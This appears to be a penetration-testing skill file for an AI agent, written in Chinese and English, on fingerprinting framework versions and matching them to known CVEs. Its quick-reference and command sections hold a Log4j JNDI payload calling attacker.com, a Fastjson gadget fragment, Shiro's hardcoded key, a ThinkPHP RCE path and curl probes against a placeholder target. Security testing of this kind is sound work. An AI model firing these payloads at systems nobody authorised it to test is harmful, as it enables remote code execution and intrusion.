---
name: dependency-cve
description: >
  Dependency version fingerprinting and CVE matching. Fastest ROI:
  identify framework/library versions from JS, headers, error pages,
  default paths, then match against known CVEs (Fastjson, Shiro,
  Log4j, Spring, Struts2, Laravel, etc.).
metadata:
  tags: "dependency,cve,version,fastjson,shiro,log4j,spring,struts2"
  category: "offensive-security"
---

# Dependency CVE Scan — 依赖版本检测

## Why This Matters

命中率最高的测试方式：你不需要手工挖洞，框架替你挖好了。
Fastjson 1.2.47 的 RCE、Log4j 的 JNDI、Shiro 的 rememberMe——
这些漏洞已经有完整 PoC，只需要确认版本。

## 1. 版本指纹来源

| 来源 | 方法 | 示例 |
|------|------|------|
| JS 文件 | 搜索库名+版本号 | `/*! jQuery v3.6.0` |
| HTML meta | generator/version 标签 | `<meta name="generator" content="WordPress 5.8">` |
| 响应头 | X-Powered-By, Server | `Server: Apache-Coyote/1.1` |
| 错误页 | 默认错误页特征 | `Whitelabel Error Page` → Spring Boot |
| 默认路径 | 探测已知路径 | `/actuator/health` → Spring Boot |
| Cookie | Cookie 名暴露框架 | `rememberMe=deleteMe;` → Apache Shiro |
| 静态资源 hash | 比对已知版本 hash | jQuery 3.6.0.min.js 的 sha256 |
| package.json/map | 源码泄露 | `path:package.json "version"` |
| Wappalyzer 模式 | 综合特征匹配 | 组合 Server+Cookie+路径 |

## 2. 高危框架速查

### Java 生态

```
Spring Boot  → /actuator/health, /actuator/env → 配置泄露
              → SpEL 注入 (特定版本)
Fastjson     → {"@type":"com.sun.rowset.JdbcRowSetImpl",...}
              → 1.2.24-1.2.47: 多个 RCE CVE
Shiro        → Cookie: rememberMe=deleteMe
              → 硬编码 AES key (kPH+bIxk5D2deZiIxcaaaA==)
              → Shiro-550/721: 反序列化 RCE
Log4j        → ${jndi:ldap://attacker.com/a} 注入点
              → CVE-2021-44228: JNDI RCE
Struts2      → .action/.do 后缀
              → S2-045/S2-046/S2-057 系列 RCE
Tomcat       → /examples/, /manager/html
              → CVE-2025-24813: 反序列化 RCE
WebLogic     → /console, /wls-wsat
              → CVE-2023-21839: JNDI RCE
```

### PHP 生态

```
Laravel     → .env 泄露, debug mode
            → CVE-2021-3129: Ignition RCE
ThinkPHP    → /index.php?s=/index/\think\app/invokefunction
            → CVE-2022-25481: 命令执行
WordPress   → /wp-admin, /wp-json
            → 插件/主题版本 → CVE
```

### Python 生态

```
Django     → DEBUG=True → 详细错误页 → 配置泄露
           → /admin/ 默认管理后台
Flask      → Werkzeug debugger → RCE
Jinja2     → SSTI: {{config}}
```

### Node.js 生态

```
Express    → X-Powered-By: Express
           → 中间件版本 → CVE
Next.js    → /_next/ 路径
```

## 3. 快速检测命令

```bash
# Java 框架
curl -s https://target/actuator/health          # Spring Boot
curl -s https://target/druid/index.html          # Druid
curl -s https://target/ -H "Cookie: rememberMe=1" # Shiro (看 Set-Cookie)
curl -s https://target/ -d '${jndi:ldap://test}' # Log4j (看反应)

# PHP 框架  
curl -s https://target/.env                       # Laravel
curl -s https://target/index.php?s=test           # ThinkPHP
curl -s https://target/wp-admin/                  # WordPress

# Python
curl -s https://target/admin/                     # Django
curl -s https://target/console                    # Flask debug

# JS 库版本
curl -s https://target/static/js/app.js | grep -E '(jQuery|Vue|React).*v[0-9]'
```

## 4. 命中后的动作

```
确认版本 → 查 CVE 数据库 → 验证可利用性
  ├── 有公开 PoC → 直接测试 (安全模式: id/whoami)
  ├── 无公开 PoC → 记录版本，继续其他测试
  └── 确认可利用 → critical finding, 立即出报告

注意:
  1. 不要在生产环境执行破坏性 payload
  2. 先用 DNS/HTTP OOB 方式验证
  3. Fastjson 反序列化 → 用 dnslog 确认即可，不弹 shell
  4. Log4j → DNS OOB 验证，不执行命令
```
